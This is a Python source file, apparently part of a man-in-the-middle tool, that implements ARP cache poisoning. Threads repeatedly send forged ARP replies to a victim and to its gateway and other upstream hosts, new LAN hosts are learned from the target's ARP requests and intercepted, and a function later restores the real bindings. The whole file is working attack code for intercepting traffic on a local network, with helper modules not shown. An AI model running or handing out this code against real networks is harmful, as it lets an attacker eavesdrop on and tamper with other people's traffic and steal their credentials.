import threading
import time

from constans import *
from helpers import *

# ------------------------------- poisoning ---------------------------------
class Poisoner(threading.Thread):
    """Keep telling one victim that a foreign IP lives at our MAC."""

    def __init__(self, ifname, attacker_mac, spoof_ip, victim_mac,
                 victim_ip, stop):
        super().__init__(daemon=True)
        self.ifname = ifname
        self.attacker_mac = attacker_mac
        self.spoof_ip = spoof_ip
        self.victim_mac = victim_mac
        self.victim_ip = victim_ip
        self.stop = stop

    def run(self):
        frame = build_arp(ARP_REPLY, self.attacker_mac, ip_bytes(self.spoof_ip),
                          self.victim_mac, ip_bytes(self.victim_ip))
        sock = open_arp_socket(self.ifname)
        try:
            while not self.stop.is_set():
                try:
                    sock.send(frame)
                except OSError:
                    pass
                self.stop.wait(POISON_INTERVAL)   # sleep, wake on Ctrl+C
        finally:
            sock.close()


class PoisonSet:
    """
    The set of remote hosts we intercept for the target.

    For every host IP we run two poisoners:
        target  <- "host IP is at attacker MAC"
        host    <- "target IP is at attacker MAC"
    Hosts can be added at startup (gateway + EXTRA_UPSTREAMS) or learned live
    from the target's broadcast ARP requests.
    """

    def __init__(self, ifname, attacker_mac, target_ip, target_mac, stop):
        self.ifname = ifname
        self.attacker_mac = attacker_mac
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.stop = stop
        self.lock = threading.Lock()
        self.macs = {}          # upstream IP -> MAC bytes
        self.threads = []
        self.learning = set()

    def add(self, ip: str, mac: bytes, quiet: bool = False) -> None:
        with self.lock:
            if ip in self.macs:
                return
            self.macs[ip] = mac
            new_threads = [
                Poisoner(self.ifname, self.attacker_mac, ip,
                         self.target_mac, self.target_ip, self.stop),
                Poisoner(self.ifname, self.attacker_mac, self.target_ip,
                         mac, ip, self.stop),
            ]
            self.threads.extend(new_threads)
        for thread in new_threads:
            thread.start()
        if not quiet:
            print("[+] intercepting %s (%s)" % (ip, mac_str(mac)))

    def mac_for(self, ip: str):
        with self.lock:
            return self.macs.get(ip)

    def ips(self):
        with self.lock:
            return list(self.macs)

    def items(self):
        with self.lock:
            return list(self.macs.items())

    def learn(self, ip: str) -> None:
        """Discover a LAN host from an ARP request/reply and intercept it."""
        with self.lock:
            if ip in self.macs or ip in self.learning:
                return
            self.learning.add(ip)

        def work():
            try:
                mac = mac_bytes(resolve_mac(self.ifname, ip, timeout=1.5))
            except RuntimeError:
                with self.lock:
                    self.learning.discard(ip)
                return
            self.add(ip, mac)
            with self.lock:
                self.learning.discard(ip)

        threading.Thread(target=work, daemon=True).start()

    def stop_all(self) -> None:
        self.stop.set()
        for thread in self.threads:
            thread.join(timeout=2.0)


def restore(ifname: str, target_mac: bytes, target_ip: str,
            upstreams, rounds: int = 5) -> None:
    """Put the real MAC/IP bindings back so the network heals."""
    sock = open_arp_socket(ifname)
    try:
        for _ in range(rounds):
            for ip, mac in upstreams:
                # tell the target the real MAC of this host
                sock.send(build_arp(ARP_REPLY, mac, ip_bytes(ip),
                                    target_mac, ip_bytes(target_ip)))
                # tell the host the real MAC of the target
                sock.send(build_arp(ARP_REPLY, target_mac,
                                    ip_bytes(target_ip), mac, ip_bytes(ip)))
            time.sleep(0.2)
    finally:
        sock.close()
